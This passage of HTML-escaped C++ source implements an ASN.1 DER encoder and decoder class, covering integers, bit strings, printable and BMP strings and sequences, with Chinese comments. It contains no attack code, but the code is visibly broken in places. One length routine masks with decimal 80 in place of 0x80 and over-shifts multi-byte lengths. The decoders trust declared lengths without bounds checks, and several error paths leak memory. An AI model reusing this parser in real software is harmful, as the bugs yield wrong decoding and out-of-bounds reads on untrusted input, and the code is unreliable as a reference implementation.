*(pMidData++); (*pMidSize)++; &#125; //输出变量 *ppTagValue = pMidValue; *ppTagSize = pMidSize; *ppDerData = pMidData; //中间变量赋空 pMidValue = NULL; pMidSize = NULL; pMidData = NULL; return 0;&#125;ITCAST_UINT32 BaseASN1::DER_ItAsn1_Low_Count_LengthOfSize(ITCAST_UINT32 iLength)&#123; if (iLength &lt;= 0x7F) return (1); else if (iLength &lt;= 0xFF) return (2); else if (iLength &lt; 0xFFFF) return (3); else if (iLength &lt;= 0xFFFFFF) return (4); else if (iLength &lt;= 0xFFFFFFFF) return (5); else &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, LengthErr, \"func DER_ItAsn1_Low_Count_LengthOfSize() err\"); return LengthErr; &#125;&#125;ITCAST_INT BaseASN1::DER_ItAsn1_GetLengthInfo(ITCAST_ANYBUF *pDerData, int *pLengthValue, int *pLengthSize)&#123; ITCAST_UINT8 *pData; int iSizeOf, iSize = 0, i; pData = pDerData-&gt;pData; if ((*pData &amp; ITCAST_DER_SHORT_ID_MASK) != ITCAST_DER_SHORT_ID_MASK) pData++; else &#123; ++pData; do &#123; ++pData; &#125; while (!(*pData &amp; 80)); &#125; ++pData; iSizeOf = *pData &amp; ITCAST_DER_FIRST_NOT_ID_MASK; if (!(*pData &amp; 80)) &#123; *pLengthSize = 1; *pLengthValue = iSizeOf; &#125; else &#123; for (i = 1; i &lt;= iSizeOf; i++) &#123; iSize |= *(++pData); iSize &lt;&lt;= 8; &#125; *pLengthSize = iSizeOf; *pLengthValue = iSize; &#125; return 0;&#125;ITCAST_INT BaseASN1::DER_ItAsn1_Low_GetLengthInfo(ITCAST_UINT8 **ppDerData, ITCAST_UINT32 **ppLengthValue, ITCAST_UINT32 **ppLengthSize)&#123; ITCAST_UINT8 *pMidData, cSizeOf; ITCAST_UINT32 lMidLength = 0, *pMidLength, *pSizeOf, i; //初始化 DER_ITASN1_LOW_CREATEUINT32(pSizeOf); DER_ITASN1_LOW_CREATEUINT32(pMidLength); pMidData = *ppDerData; //读长度 if (!(*pMidData &amp; ITCAST_DER_FIRST_YES_ID_MASK))//short &#123; cSizeOf = 1; lMidLength = (ITCAST_UINT32)(*(pMidData++) &amp; ITCAST_DER_FIRST_NOT_ID_MASK); &#125; else //long &#123; cSizeOf = *(pMidData++) &amp; ITCAST_DER_FIRST_NOT_ID_MASK; if (cSizeOf &gt; 4/* ||cSizeOf &lt;0*/) &#123; if (pSizeOf) &#123; free(pSizeOf); pSizeOf = NULL; &#125; if (pMidLength) &#123; free(pMidLength); &#125; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, LengthErr, \"func DER_ItAsn1_Low_GetLengthInfo() err\"); return LengthErr; &#125; else &#123; for (i = 1; i &lt; cSizeOf; i++) &#123; lMidLength |= (ITCAST_UINT32)*(pMidData++); lMidLength &lt;&lt;= 8; &#125; lMidLength |= (ITCAST_UINT32)*(pMidData++); cSizeOf++; &#125; &#125; //输出信息 *pMidLength = lMidLength; *pSizeOf = cSizeOf; *ppLengthValue = pMidLength; *ppLengthSize = pSizeOf; *ppDerData = pMidData; //中间变量赋空 pMidData = NULL; pMidLength = NULL; pSizeOf = NULL; return 0;&#125;//将一个ITCAST_UINT32类型的整数转换成字符表示形式ITCAST_INT BaseASN1::DER_ItAsn1_Low_IntToChar(ITCAST_UINT32 integer, ITCAST_UINT8 **ppData, ITCAST_UINT32 **ppLength)&#123; ITCAST_UINT8 *pMidData = NULL, *pMidSite = NULL; ITCAST_UINT32 *pMidLength = NULL; ITCAST_UINT32 iValue; //初始化 iValue = integer; DER_ITASN1_LOW_CREATEUINT32(pMidLength); if (iValue &gt; 0xFFFFFFFF)//检测整数值 return DataRangeErr; else &#123; if (iValue &gt; 0xFFFFFF) &#123; if (iValue &gt;= 0x80000000) &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 5); pMidSite = pMidData; *(pMidData++) = 0; *pMidLength = 1; &#125; else &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 4); pMidSite = pMidData; &#125; *(pMidData++) = (ITCAST_UINT8)(iValue &gt;&gt; 24); *(pMidData++) = (ITCAST_UINT8)(iValue &gt;&gt; 16); *(pMidData++) = (ITCAST_UINT8)(iValue &gt;&gt; 8); *(pMidData++) = (ITCAST_UINT8)(iValue); (*pMidLength) += 4; &#125; else if (iValue &gt; 0xFFFF) &#123; if (iValue &gt;= 0x800000) &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 4); pMidSite = pMidData; *(pMidData++) = 0; *pMidLength = 1; &#125; else &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 3); pMidSite = pMidData; &#125; *(pMidData++) = (ITCAST_UINT8)(iValue &gt;&gt; 16); *(pMidData++) = (ITCAST_UINT8)(iValue &gt;&gt; 8); *(pMidData++) = (ITCAST_UINT8)(iValue); (*pMidLength) += 3; &#125; else if (iValue &gt; 0xFF) &#123; if (iValue &gt;= 0x8000) &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 3); pMidSite = pMidData; *(pMidData++) = 0; *pMidLength = 1; &#125; else &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 2); pMidSite = pMidData; &#125; *(pMidData++) = (ITCAST_UINT8)(iValue &gt;&gt; 8); *(pMidData++) = (ITCAST_UINT8)(iValue); (*pMidLength) += 2; &#125; else &#123;#if 0 // 尼玛iValue是unsigned int 这个条件永远成立 if (iValue &gt;= 0x0) &#123;#endif if (iValue &gt;= 0x80) &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 2); pMidSite = pMidData; *(pMidData++) = 0; *pMidLength = 1; &#125; else &#123; DER_ITASN1_LOW_CREATEUINT8(pMidData, 1); pMidSite = pMidData; &#125; *pMidData = (ITCAST_UINT8)(iValue); (*pMidLength) += 1; &#125;#if 0 &#125;#endif &#125; //信息输出 *ppData = pMidSite; *ppLength = pMidLength; //中间变量赋空 pMidData = NULL; pMidSite = NULL; pMidLength = NULL; return 0;&#125;//将一个用字符表示的整数转换成ITCAST_UINT32型整数ITCAST_INT BaseASN1::DER_ItAsn1_Low_CharToInt(ITCAST_UINT8 *aData, ITCAST_UINT32 lLength, ITCAST_UINT32 **ppInteger)&#123; ITCAST_UINT32 lIntMid = 0, i; ITCAST_UINT32 *pIntMid = NULL; DER_ITASN1_LOW_CREATEUINT32(pIntMid); //转换 if ((*aData == 0) &amp;&amp; (lLength &gt; 1)) &#123; aData++; lLength--; &#125; for (i = 1; i &lt; lLength; i++) &#123; lIntMid |= *aData++; lIntMid &lt;&lt;= 8; &#125; lIntMid |= *aData++; //输出 *pIntMid = lIntMid; *ppInteger = pIntMid; //中间变量赋空 pIntMid = NULL; return 0;&#125;//写Tag和Length值ITCAST_INT BaseASN1::DER_ItAsn1_Low_WriteTagAndLength(ITCAST_ANYBUF *pAnyIn, ITCAST_UINT8 cTag, ITCAST_ANYBUF **ppAnyOut, ITCAST_UINT8 **ppUint8Value)&#123; ITCAST_ANYBUF *pMidAny = NULL; ITCAST_UINT8 *pMidValue = NULL, cIdentifier; ITCAST_UINT32 iMidSize, iMidSizeOf, iMidLength, i; //计算长度,Bitstring和Integer类型与其他类型分开处理 if ((cTag != ITCAST_DER_ID_BITSTRING) &amp;&amp; (cTag != ITCAST_DER_ID_INTEGER)) iMidSize = pAnyIn-&gt;dataLen; else if (cTag == ITCAST_DER_ID_INTEGER) if (!(*(pAnyIn-&gt;pData) &amp; ITCAST_DER_FIRST_YES_ID_MASK)) iMidSize = pAnyIn-&gt;dataLen; else iMidSize = pAnyIn-&gt;dataLen + 1; else iMidSize = pAnyIn-&gt;dataLen + 1; iMidLength = iMidSize; iMidSizeOf = DER_ItAsn1_Low_Count_LengthOfSize(iMidSize); if (/*iMidSizeOf &lt; 0 || */iMidSizeOf &gt; 5) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, LengthErr, \"func DER_ItAsn1_Low_WriteTagAndLength() err\"); return LengthErr; &#125; iMidSize += 1 + iMidSizeOf; DER_CREATE_LOW_ITCAST_ANYBUF(pMidAny); DER_ITASN1_LOW_CREATEUINT8(pMidValue, iMidSize); if (iMidSize == 11) &#123; iMidSize = 11; &#125; pMidAny-&gt;pData = pMidValue; //检测Tag值 if (cTag &amp; ITCAST_DER_CONTEXT_SPECIFIC) cIdentifier = cTag; else &#123; cIdentifier = DER_ITASN1_LOW_IDENTIFIER(cTag); //if (cIdentifier != pAnyIn -&gt;dataType) // return MemoryErr; &#125; *(pMidValue++) = cTag; pMidAny-&gt;dataType = (ITCAST_UINT32)cIdentifier; pMidAny-&gt;dataLen = iMidSize; if (iMidSizeOf == 1) &#123; *(pMidValue++) = (ITCAST_UINT8)(iMidLength); &#125; else &#123; *(pMidValue++) = ITCAST_DER_FIRST_YES_ID_MASK | (ITCAST_UINT8)(iMidSizeOf - 1); for (i = iMidSizeOf - 1; i &gt; 0; i--) &#123; *(pMidValue++) = (ITCAST_UINT8)(iMidLength &gt;&gt; 8 * (i - 1)); &#125; &#125; if (pMidAny-&gt;dataType == ITCAST_DER_ID_BITSTRING) &#123; pMidAny-&gt;unusedBits = pAnyIn-&gt;unusedBits; *(pMidValue++) = (ITCAST_UINT8)(pAnyIn-&gt;unusedBits); &#125; if (pMidAny-&gt;dataType == ITCAST_DER_ID_INTEGER) &#123; if (*(pAnyIn-&gt;pData) &amp; ITCAST_DER_FIRST_YES_ID_MASK) *(pMidValue++) = 0x0; &#125; //输出信息 *ppUint8Value = pMidValue; *ppAnyOut = pMidAny; pMidAny = NULL; pMidValue = NULL; return 0;&#125;//读Tag和Length值ITCAST_INT BaseASN1::DER_ItAsn1_Low_ReadTagAndLength(ITCAST_ANYBUF *pAnyIn, ITCAST_UINT8 **ppUint8Data, ITCAST_ANYBUF **ppAnyOut, ITCAST_UINT8 **ppUint8Value)&#123; ITCAST_ANYBUF *pMidAny = NULL; ITCAST_UINT32 *pMidTag = NULL; ITCAST_UINT8 *pMidValue = NULL; ITCAST_UINT32 *pMidSize = NULL, *pMidSizeOf = NULL, iMidLength = 0; DER_CREATE_LOW_ITCAST_ANYBUF(pMidAny); DER_ItAsn1_Low_GetTagInfo(ppUint8Data, &amp;pMidTag, &amp;pMidSize); //检测Tag值是否正确 if (!(*pMidTag == ITCAST_DER_ID_STRING_PRINTABLE) || (*pMidTag == ITCAST_DER_ID_STRING_BMP)) &#123; /*************************************** ***** if (*pMidTag != pAnyIn -&gt;dataType) **** return MemoryErr; ***************************************wyy*/ &#125; pMidAny-&gt;dataType = *pMidTag; iMidLength += *pMidSize; DER_ITCAST_Free(pMidSize); DER_ItAsn1_Low_GetLengthInfo(ppUint8Data, &amp;pMidSize, &amp;pMidSizeOf); //检测总长度是否正确 iMidLength += *pMidSize + *pMidSizeOf; if (iMidLength != pAnyIn-&gt;dataLen) &#123; DER_ITCAST_Free(pMidSize); DER_ITCAST_Free(pMidSizeOf); DER_ITCAST_Free(pMidTag); DER_ITCAST_Free(pMidAny); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, LengthNotEqual, \"func DER_ItAsn1_Low_ReadTagAndLength() err\"); return LengthNotEqual; &#125; //Bitstring和Integer类型与其他类型不同 if (pAnyIn-&gt;dataType == ITCAST_DER_ID_BITSTRING) &#123; pMidAny-&gt;unusedBits = pAnyIn-&gt;unusedBits; //检测unusedBits值是否正确 //if ((ITCAST_UINT8)(pMidAny -&gt;unusedBits) != **ppUint8Data) // return MemoryErr; (*ppUint8Data)++; (*pMidSize)--; &#125; if (*pMidTag == ITCAST_DER_ID_INTEGER) &#123; pMidValue = *ppUint8Data; if ((*pMidValue == 0x0) &amp;&amp; (*(++pMidValue) &amp; ITCAST_DER_FIRST_YES_ID_MASK)) &#123; (*ppUint8Data)++; (*pMidSize)--; &#125; pMidValue = NULL; &#125; DER_ITCAST_Free(pMidTag); //创建pMidAny的pData空间 if (*pMidSize &gt; 0) &#123; DER_ITASN1_LOW_CREATEUINT8(pMidValue, *pMidSize); if (pMidValue == NULL) &#123; DER_ITCAST_Free(pMidSize); DER_ITCAST_Free(pMidSizeOf); DER_ITCAST_Free(pMidAny); return MemoryErr; &#125; &#125; else &#123; pMidValue = NULL; &#125; //输出 *ppUint8Value = pMidValue; pMidAny-&gt;dataLen = *pMidSize; pMidAny-&gt;pData = *ppUint8Value; *ppAnyOut = pMidAny; DER_ITCAST_Free(pMidSize); DER_ITCAST_Free(pMidSizeOf); //中间变量赋空 pMidAny = NULL; pMidValue = NULL; return 0;&#125;//DER编码整数数据ITCAST_INT BaseASN1::DER_ItAsn1_WriteInteger(ITCAST_UINT32 integer, ITASN1_INTEGER **ppDerInteger)&#123; ITCAST_UINT8 *pData, *pMidSite; ITCAST_UINT32 *pLength; ITASN1_INTEGER *pInteger = NULL; ITCAST_UINT8 *pMidUint8 = NULL, cTag = ITCAST_DER_INTEGER; int iResult; //编码pData域 iResult = DER_ItAsn1_Low_IntToChar(integer, &amp;pData, &amp;pLength); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_IntToChar() err != NoErr\"); return iResult; &#125; DER_ITASN1_LOW_CREATEUINT8(pMidUint8, *pLength + 2); pMidSite = pMidUint8; *(pMidUint8++) = cTag; *(pMidUint8++) = (ITCAST_UINT8)*pLength; memcpy(pMidUint8, pData, *pLength); //形成ITASN1_INTEGER结构 DER_CREATE_LOW_ITCAST_ANYBUF(pInteger); DER_ITASN1_LOW_CHECKERR(iResult, MemoryErr); pInteger-&gt;pData = pMidSite; pInteger-&gt;unusedBits = 0; pInteger-&gt;dataType = DER_ITASN1_LOW_IDENTIFIER(cTag); pInteger-&gt;memoryType = MallocMemory; pInteger-&gt;dataLen = *pLength + 2; pInteger-&gt;next = NULL; pInteger-&gt;prev = NULL; //输出 *ppDerInteger = pInteger; DER_ITCAST_Free(pData); DER_ITCAST_Free(pLength); //中间变量赋空 pMidSite = NULL; pInteger = NULL; pMidUint8 = NULL; return 0;&#125;//DER解码整数数据ITCAST_INT BaseASN1::DER_ItAsn1_ReadInteger(ITASN1_INTEGER *pDerInteger, ITCAST_UINT32 *pInteger)&#123; ITCAST_UINT8 *pMidData = NULL; ITCAST_UINT32 *pTag = NULL; ITCAST_UINT32 lMidLength, *pMidSize = NULL, *pMidSizeOf = NULL; int iResult; //解码 pMidData = pDerInteger-&gt;pData; iResult = DER_ItAsn1_Low_GetTagInfo(&amp;pMidData, &amp;pTag, &amp;pMidSize); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_ReadInteger() err check iResult != NoErr\"); return iResult; &#125; DER_ITCAST_Free(pTag); DER_ITCAST_Free(pMidSize); iResult = DER_ItAsn1_Low_GetLengthInfo(&amp;pMidData, &amp;pMidSize, &amp;pMidSizeOf); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_GetLengthInfo() err\"); return iResult; &#125; lMidLength = *pMidSize; DER_ITCAST_Free(pMidSize); DER_ITCAST_Free(pMidSizeOf); iResult = DER_ItAsn1_Low_CharToInt(pMidData, lMidLength, &amp;pMidSize); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_CharToInt() err\"); return iResult; &#125; //输出 *pInteger = *pMidSize; DER_ITCAST_Free(pMidSize); //中间变量赋空 pMidData = NULL; return 0;&#125;//DER编码BitString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_WriteBitString(ITASN1_BITSTRING *pBitString, ITASN1_BITSTRING **ppDerBitString)&#123; ITASN1_BITSTRING *pMidBitString = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidValue = NULL; ITCAST_UINT8 cTag = ITCAST_DER_BITSTRING; int iResult; //编码 iResult = DER_ItAsn1_Low_WriteTagAndLength(pBitString, cTag, &amp;pMidBitString, &amp;pMidValue); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_WriteTagAndLength() err\"); return iResult; &#125; pMidData = pBitString-&gt;pData; memcpy(pMidValue, pMidData, pBitString-&gt;dataLen); //输出 *ppDerBitString = pMidBitString; //中间变量赋空 pMidBitString = NULL; pMidData = NULL; pMidValue = NULL; return 0;&#125;//DER解码BitString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_ReadBitString(ITASN1_BITSTRING *pDerBitString, ITASN1_BITSTRING **ppBitString)&#123; ITASN1_BITSTRING *pMidBitString = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidValue = NULL; int iResult; //解码 pMidData = pDerBitString-&gt;pData; iResult = DER_ItAsn1_Low_ReadTagAndLength(pDerBitString, &amp;pMidData, &amp;pMidBitString, &amp;pMidValue); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_ReadTagAndLength() err\"); return iResult; &#125; memcpy(pMidValue, pMidData, pMidBitString-&gt;dataLen); //输出 *ppBitString = pMidBitString; //中间变量赋空 pMidBitString = NULL; pMidData = NULL; pMidValue = NULL; return 0;&#125;//DER编码CharString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_WriteCharString(ITCAST_ANYBUF *pCharString, ITCAST_ANYBUF **ppDerCharString)&#123; ITCAST_ANYBUF *pMidCharString = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidValue = NULL; ITCAST_UINT8 cTag = ITCAST_DER_ID_STRING_PRINTABLE; int iResult; //编码 iResult = DER_ItAsn1_Low_WriteTagAndLength(pCharString, cTag, &amp;pMidCharString, &amp;pMidValue); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_WriteTagAndLength() err\"); return iResult; &#125; pMidData = pCharString-&gt;pData; memcpy(pMidValue, pMidData, pCharString-&gt;dataLen); //输出 *ppDerCharString = pMidCharString; //中间变量赋空 pMidCharString = NULL; pMidData = NULL; pMidValue = NULL; return 0;&#125;//DER解码PrintableString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_ReadCharString(ITCAST_ANYBUF *pDerCharString, ITCAST_ANYBUF **ppCharString)&#123; ITCAST_ANYBUF *pMidCharString = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidValue = NULL; int iResult; //解码 pMidData = pDerCharString-&gt;pData; iResult = DER_ItAsn1_Low_ReadTagAndLength(pDerCharString, &amp;pMidData, &amp;pMidCharString, &amp;pMidValue); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_ReadTagAndLength() err\"); return iResult; &#125; memcpy(pMidValue, pMidData, pMidCharString-&gt;dataLen); //输出 *ppCharString = pMidCharString; //中间变量赋空 pMidCharString = NULL; pMidData = NULL; pMidValue = NULL; return 0;&#125;//DER编码BmpString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_WriteBmpString(ITASN1_BMPSTRING *pBmpString, ITASN1_BMPSTRING **ppDerBmpString)&#123; ITCAST_ANYBUF *pMidBmpString = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidValue = NULL; ITCAST_UINT8 cTag = ITCAST_DER_ID_STRING_BMP; int iResult; //编码 iResult = DER_ItAsn1_Low_WriteTagAndLength(pBmpString, cTag, &amp;pMidBmpString, &amp;pMidValue); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_WriteTagAndLength() err\"); return iResult; &#125; pMidData = pBmpString-&gt;pData; memcpy(pMidValue, pMidData, pBmpString-&gt;dataLen); //输出 *ppDerBmpString = pMidBmpString; //中间变量赋空 pMidBmpString = NULL; pMidData = NULL; pMidValue = NULL; return 0;&#125;//DER解码BmpString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_ReadBmpString(ITASN1_BMPSTRING *pDerBmpString, ITASN1_BMPSTRING **ppBmpString)&#123; ITCAST_ANYBUF *pMidBmpString = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidValue = NULL; int iResult; //解码 pMidData = pDerBmpString-&gt;pData; iResult = DER_ItAsn1_Low_ReadTagAndLength(pDerBmpString, &amp;pMidData, &amp;pMidBmpString, &amp;pMidValue); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_ReadTagAndLength() err\"); return iResult; &#125; memcpy(pMidValue, pMidData, pMidBmpString-&gt;dataLen); //输出 *ppBmpString = pMidBmpString; //中间变量赋空 pMidBmpString = NULL; pMidData = NULL; pMidValue = NULL; return 0;&#125;//DER编码PrintableString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_WritePrintableString(ITASN1_PRINTABLESTRING *pPrintString, ITASN1_PRINTABLESTRING **ppDerPrintString)&#123; int iResult; if (pPrintString-&gt;dataType == ITCAST_DER_STRING_BMP) &#123; iResult = DER_ItAsn1_WriteBmpString(pPrintString, ppDerPrintString); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_WriteBmpString() err\"); return iResult; &#125; &#125; else &#123; iResult = DER_ItAsn1_WriteCharString(pPrintString, ppDerPrintString); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_WriteCharString() err\"); return iResult; &#125; &#125; return 0;&#125;//DER解码PrintableString类型数据ITCAST_INT BaseASN1::DER_ItAsn1_ReadPrintableString(ITASN1_PRINTABLESTRING *pDerPrintString, ITASN1_PRINTABLESTRING **ppPrintString)&#123; ITASN1_PRINTABLESTRING *pMidPrintString = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidValue = NULL; int iResult; //解码 pMidData = pDerPrintString-&gt;pData; iResult = DER_ItAsn1_Low_ReadTagAndLength(pDerPrintString, &amp;pMidData, &amp;pMidPrintString, &amp;pMidValue); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_ReadTagAndLength() err\"); return iResult; &#125; memcpy(pMidValue, pMidData, pMidPrintString-&gt;dataLen); //输出 *ppPrintString = pMidPrintString; //中间变量赋空 pMidPrintString = NULL; pMidData = NULL; pMidValue = NULL; return 0;&#125;//DER编码Sequence类型数据ITCAST_INT BaseASN1::DER_ItAsn1_WriteSequence(ITASN1_SEQUENCE *pSequence, ITCAST_ANYBUF **ppDerSequence)&#123; ITASN1_SEQUENCE *pMidSequence = NULL, *pMidNext1 = NULL; ITCAST_UINT8 *pMidValue = NULL, *pMidSite; ITCAST_UINT32 lSizeOf = 0, i, lMidLength = 0; ITCAST_UINT8 cTag = ITCAST_DER_SEQUENCE; //计算Sequence数据长度 pMidNext1 = pSequence; while (pMidNext1 != NULL) &#123; lMidLength += pMidNext1-&gt;dataLen; pMidNext1 = pMidNext1-&gt;next; &#125; lSizeOf = DER_ItAsn1_Low_Count_LengthOfSize(lMidLength); DER_ITASN1_LOW_CREATEUINT8(pMidValue, lMidLength + 1 + lSizeOf); pMidSite = pMidValue; //写Tag值 *(pMidValue++) = cTag; //写长度 if (lSizeOf == 1) *(pMidValue++) = (ITCAST_UINT8)lMidLength; else &#123; *(pMidValue++) = ITCAST_DER_FIRST_YES_ID_MASK | ((ITCAST_UINT8)(lSizeOf - 1)); for (i = lSizeOf - 1; i &gt; 0; i--) *(pMidValue++) = (ITCAST_UINT8)(lMidLength &gt;&gt; 8 * (i - 1)); &#125; pMidNext1 = pSequence; //copy数据 while (pMidNext1 != NULL) &#123; memcpy(pMidValue, pMidNext1-&gt;pData, pMidNext1-&gt;dataLen); pMidValue += pMidNext1-&gt;dataLen; pMidNext1 = pMidNext1-&gt;next; &#125; //创建ITCAST_ANYBUF结构 DER_CREATE_LOW_ITCAST_ANYBUF(pMidSequence); pMidSequence-&gt;dataLen = lMidLength + 1 + lSizeOf; pMidSequence-&gt;pData = pMidSite; pMidSequence-&gt;dataType = DER_ITASN1_LOW_IDENTIFIER(cTag); //输出 *ppDerSequence = pMidSequence; //中间变量赋空 pMidSequence = NULL; pMidNext1 = NULL; pMidValue = NULL; pMidSite = NULL; return 0;&#125;void BaseASN1::DER_DI_FreeAnybuf(ITCAST_ANYBUF * pAnyBuf)&#123; ITCAST_ANYBUF * pTmp; pTmp = pAnyBuf; if (pAnyBuf == NULL) &#123; return; &#125; while (pAnyBuf-&gt;next) &#123; pTmp = pAnyBuf-&gt;next; if (pAnyBuf-&gt;pData) &#123; DER_ITCAST_Free(pAnyBuf-&gt;pData); &#125; DER_ITCAST_Free(pAnyBuf); pAnyBuf = pTmp; &#125; if (pAnyBuf-&gt;pData) &#123; DER_ITCAST_Free(pAnyBuf-&gt;pData); &#125; DER_ITCAST_Free(pAnyBuf); return;&#125;//DER解码Sequence类型数据ITCAST_INT BaseASN1::DER_ItAsn1_ReadSequence(ITCAST_ANYBUF *pDerSequence, ITASN1_SEQUENCE **ppSequence)&#123; ITASN1_SEQUENCE *pMidNext1 = NULL, *pMidNext2 = NULL, *pMidSequence = NULL; ITCAST_UINT8 *pMidData = NULL, *pMidItemData = NULL, *pMidValue = NULL; ITCAST_UINT32 lMidLength = 0, *pTagValue = NULL, *pLengthValue = NULL; ITCAST_UINT32 *pTagSize = NULL, *pLengthSize = NULL; int lTotalLength = 0; int iResult; ITCAST_UINT8 firstTag = TRUE; int i = 0; //初始化 pMidData = pDerSequence-&gt;pData; //检测Tag值 iResult = DER_ItAsn1_Low_GetTagInfo(&amp;pMidData, &amp;pTagValue, &amp;pTagSize); if (iResult != NoErr) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"func DER_ItAsn1_Low_GetTagInfo() err\"); return iResult; &#125; if ((ITCAST_UINT8)*pTagValue != ITCAST_DER_ID_SEQUENCE) &#123; DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, InvalidTag, \"check pTagValue != ITCAST_DER_ID_SEQUENCE err\"); return InvalidTag; &#125; //检测长度值 iResult = DER_ItAsn1_Low_GetLengthInfo(&amp;pMidData, &amp;pLengthValue, &amp;pLengthSize); if (iResult != NoErr) &#123; DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"fun DER_ItAsn1_Low_GetLengthInfo() err\"); return iResult; &#125; if (pDerSequence-&gt;dataLen != *pTagSize + *pLengthSize + *pLengthValue) &#123; DER_ITCAST_Free(pLengthValue); DER_ITCAST_Free(pLengthSize); DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, LengthNotEqual, \"fun check length err\"); return LengthNotEqual; &#125; lTotalLength = *pLengthValue; DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); DER_ITCAST_Free(pLengthValue); DER_ITCAST_Free(pLengthSize); //创建Sequence链,头及其余元素 while (lTotalLength &gt; 0) &#123; pMidItemData = pMidData; iResult = DER_ItAsn1_Low_GetTagInfo(&amp;pMidItemData, &amp;pTagValue, &amp;pTagSize); if (iResult != NoErr) &#123; DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"fun DER_ItAsn1_Low_GetTagInfo() err\"); return iResult; &#125; iResult = DER_ItAsn1_Low_GetLengthInfo(&amp;pMidItemData, &amp;pLengthValue, &amp;pLengthSize); if (iResult != NoErr) &#123; DER_ITCAST_Free(pLengthValue); DER_ITCAST_Free(pLengthSize); DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, iResult, \"fun DER_ItAsn1_Low_GetLengthInfo() err\"); return iResult; &#125; lMidLength = *pTagSize + *pLengthSize + *pLengthValue; DER_ITASN1_LOW_CREATEUINT8(pMidValue, lMidLength); if (pMidValue == NULL) &#123; DER_ITCAST_Free(pLengthValue); DER_ITCAST_Free(pLengthSize); DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, MemoryErr, \"pMidValue is null err\"); return MemoryErr; &#125; memcpy(pMidValue, pMidData, lMidLength); if (firstTag) &#123; firstTag = FALSE; DER_CREATE_LOW_ITCAST_ANYBUF(pMidSequence); pMidSequence-&gt;pData = pMidValue; pMidSequence-&gt;dataType = *pTagValue; pMidSequence-&gt;dataLen = lMidLength; pMidNext2 = pMidSequence; pMidNext2-&gt;prev = NULL; pMidNext2-&gt;next = NULL; &#125; else &#123; DER_CREATE_LOW_ITCAST_ANYBUF(pMidNext1); pMidNext1-&gt;pData = pMidValue; pMidNext1-&gt;dataType = *pTagValue; pMidNext1-&gt;dataLen = lMidLength; pMidNext1-&gt;prev = pMidNext2; pMidNext2-&gt;next = pMidNext1; pMidNext2 = pMidNext2-&gt;next; pMidNext2-&gt;next = NULL; &#125; pMidData += lMidLength; lTotalLength -= lMidLength; DER_ITCAST_Free(pTagValue); DER_ITCAST_Free(pTagSize); DER_ITCAST_Free(pLengthValue); DER_ITCAST_Free(pLengthSize); i++; &#125; if (lTotalLength != 0) &#123; m_log.Log(__FILE__, __LINE__, ItcastLog::ERROR, LengthErr, \"lTotalLength != 0 err\"); DER_DI_FreeAnybuf(pMidSequence); return LengthErr; &#125; //信息返回 *ppSequence = pMidSequence; //中间变量赋空 pMidNext1 = NULL; pMidNext2 = NULL; pMidSequence = NULL; pMidData = 